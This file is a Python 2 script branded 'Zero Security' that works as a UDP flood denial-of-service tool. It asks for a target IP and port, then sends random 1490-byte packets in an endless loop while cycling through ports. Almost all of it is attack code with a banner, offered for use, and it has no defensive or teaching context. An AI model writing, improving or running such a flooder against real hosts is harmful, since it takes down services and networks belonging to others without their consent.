# Zero Security
from colorama import Fore, Back, Style
import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

run = os.system

run("clear")
print (Fore.GREEN + """
 _____                ____                       _ _         
|__  /___ _ __ ___   / ___|  ___  ___ _   _ _ __(_) |_ _   _ 
  / // _ \ '__/ _ \  \___ \ / _ \/ __| | | | '__| | __| | | |
 / /|  __/ | | (_) |  ___) |  __/ (__| |_| | |  | | |_| |_| |
/____\___|_|  \___/  |____/ \___|\___|\__,_|_|  |_|\__|\__, |
                                                       |___/ 
Coded By > T.ME/Alone_Heartless
""")

print (Fore.RED + "[1] > Start Attack\n\n[2] > Close")
data = raw_input("\n\n>>> Enter ( 1 - 2 ) > ")
if data == "1":

    ip = raw_input("\n\n>>> Enter Target IP => ")
    port = input("\n\n>>> Enter Port (Defult 80) => ")
    print (Fore.BLUE + "\n\nPls Wait...\n\n")
    time.sleep(4)
    sent = 0
    while True:

        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print (Fore.RED + "=> Sent %s Packet To %s Throught Port > %s <"%(sent,ip,port))
        if port == 65534:
            port = 1

elif data == "2":
    run("exit()")
    run("clear")
